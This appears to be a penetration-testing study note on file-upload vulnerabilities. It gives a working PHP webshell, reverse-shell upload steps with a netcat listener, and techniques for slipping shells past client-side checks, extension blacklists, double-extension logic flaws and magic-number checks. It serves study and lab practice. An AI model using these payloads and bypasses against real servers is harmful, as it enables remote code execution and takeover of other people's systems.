- websites providing an upload functionality which are not validating the user input properly 
- possibilities:
	- overwriting existing files
	- uploading and executing webshells or reverse shells 

# Overwriting Files
- occurs when the server is not checking if the file name already exists or if the server does not append a unique timestamp to the filename

# Uploading shells on a server 
1. search web directories where the file is located (but modern websites just serve the file from the backend) e.g. `uploads` / `resources` etc. 
	- maybe if look after uploading a valid path where it is taken from or where you are redirected at
	- use gobuster to enumerate directories [Directory and Files Enumeration](Directory%20and%20Files%20Enumeration.md)

## Webshell for RCE 
- [Remote Code Execution](../Remote%20Code%20Execution.md)
- create vulnerable file which is written in the same language as the backend and takes a parameter which is executed on the server e.g.:
```php
<?php  
    echo system($_GET["cmd"]);  
?>
```
- upload the file to the server named e.g.: `shell.php`
- execute commands like: `http://URL/uploads/shell.php?cmd=whoami`

## Reverse Shell
- [Reverse Shell](Reverse%20Shell.md)
- locally listen on a port for a connection from the vulnerable computer: `nv -lnvp PORT`
- create vulnerable file which is written in the same language as the backend. for example for PHP: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php and change the your IP and PORT
- upload the file to the server named e.g.: `shell.php`
- initiate the connection from the vulnerable computer by running the script by accessing the file in the browser: `http://URL/uploads/shell.php`


# Bypassing Client-Side Filtering
Example: 1.  have a look the source code where the validation happens
   ![](attachments/Pasted%20image%2020230618032340.png)
   ![](attachments/Pasted%20image%2020230618032404.png)
which is validating if the file type is `image/png`

## Using Curl

```curl
curl -d @filename [URL]
```
or 
```curl
curl -F logo=@filename [URL]
```

-F for multipart/form-data

With [Burp Suite](Burp%20Suite.md) you can see which request parameter needs to be send with

## Turn off Javascript in your browser 
mostly not suitable because most websites require JS to run properly

## Intercept and modify the incoming page
- using [Burp Suite](Burp%20Suite.md)
- intercept the incoming web page and strip out the Javascript filter before it has a chance to run
1. open BurpSuite and activate the Proxy, add the scope and so on
2. if the javascript file is send in a different file we need to remove the `^js$|` from the ignored file extensions in the `Proxy Options -> Intercept Client Requests`:
   ![](attachments/Pasted%20image%2020230618034851.png)
3. intercept the response to the request (to intercept the requested java validation file) make sure to remove the cache to fetch the js files again:
   ![](attachments/Pasted%20image%2020230618035332.png)
4.    remove filter and forward request:
   ![](attachments/Pasted%20image%2020230618035450.png)
   ![](attachments/Pasted%20image%2020230618035539.png)
5. upload the file `shell.png`
   

## Intercept and modify the file upload
- load webpage as normal (without intercepting it before)
- intercept the file upload 
1. change filetype to JPG as MIME type is based on the file extension `shell.jpg`
2. select the file (filter is allowing that)
3. intercept upload request with [Burp Suite](Burp%20Suite.md)
4. change filename from `shell.jpg` to `shell.php` and change Content-Type (from `image/jpeg`) to `text/x-php`:
   ![](attachments/Pasted%20image%2020230618040315.png)
   ![](attachments/Pasted%20image%2020230618040343.png)


# Bypassing Server-Side Filtering
- we mostly dont have the source code, so we have to try it out

## Blacklist
- some servers have a blacklist. (a whitelist would be better)
- here are probably not all file extensions flagged. eg:
```php
<?php  
    //Get the extension  
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];  
    //Check the extension against the blacklist -- .php and .phtml  
    switch($extension){  
        case "php":  
        case "phtml":  
        case NULL:  
            $uploadFail = True;  
            break;  
        default:  
            $uploadFail = False;  
    }  
?>
```
- Here we could just use a file extension like `php5` as you see possible php file extensions: https://en.wikipedia.org/wiki/PHP

## Logic Flaw in validation
- some webpages are just checking the first `.` and the file extension after that, which you could bypass like `shell.png.php`

## Magic Numbers
- more accurate way of determining the contents of a file in comparison to the file extension or MIME type
- The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content
- e.g. a PNG file would have these bytes at the very top of the file: `89 50 4E 47 0D 0A 1A 0A`  (with the `hexeditor`)
  ![](attachments/Pasted%20image%2020230618044325.png)
  https://en.wikipedia.org/wiki/List_of_file_signatures
- check the file type of our `shell.php` -> `file shell.php` output: shell.php: PHP script, Unicode text, UTF-8 text
- write `AAAAAAAA` at the beginning of the file (because A is 41 and we need that place 8 times to replace it with `89 50 4E 47 0D 0A 1A 0A`)
  ```php
AAAAAAAA
<?php  
    echo system($_GET["cmd"]);  
?>

```
`file shell.php` -> shell.php: Unicode text, UTF-8 text
![](attachments/Pasted%20image%2020230618050144.png) 
- use the `hexeditor` to edit the `41 41 41 41 41 41 41 41` to `89 50 4E 47 0D 0A 1A 0A`
  ![](attachments/Pasted%20image%2020230618050611.png)
`file shell.php` -> shell.php: data
```php
�PNG
▒

<?php  
    echo system($_GET["cmd"]);  
?>

```

